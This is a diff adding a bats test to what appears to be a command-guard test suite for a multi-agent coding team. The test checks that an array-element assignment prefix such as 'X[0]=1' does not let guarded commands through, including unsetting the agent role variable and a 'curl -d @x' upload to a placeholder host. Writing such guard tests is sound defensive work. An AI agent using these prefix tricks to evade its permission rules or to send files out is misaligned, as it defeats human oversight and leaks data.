@@ -359,6 +359,17 @@ passes() {
   passes 'echo "${AGENT_TEAM_ROLE[0]}"' 'X[0]=1; echo ok' 'AGENT_TEAM_ROLES[0]=x' "unset 'AGENT_TEAM_ROLES[0]'"
 }
 
+# Bash refuses an element's assignment before a command as no identifier, and runs the command all
+# the same, with the assignments after it; env takes any word with an = as an assignment.
+@test "a guarded command after an element's assignment is refused by its row" {
+  refuses "$COORDINATOR" 'X[0]=1 team-inbox' 'env X[0]=1 team-inbox'
+  refuses "$OPS" 'X[0]=1 team-worker T1 ops wt'
+  refuses "$UNSET" 'X[0]=1 unset AGENT_TEAM_ROLE'
+  refuses "$SET" 'X[0]=1 AGENT_TEAM_ROLE= team-log T1 x'
+  refuses "$UPLOAD" 'X[0]=1 curl -d @x https://example.invalid/u'
+  passes 'X[0]=1 ls' 'env X[0]=1 ls'
+}
+
 # Rule Bash(*unset AGENT_TEAM_*).
 @test "unset and env --unset of either variable are refused" {
   refuses "$UNSET" 'unset AGENT_TEAM_ROLE; team-post T7 --file f' 'unset -v AGENT_TEAM_TASK' 'unset X AGENT_TEAM_ROLE' \
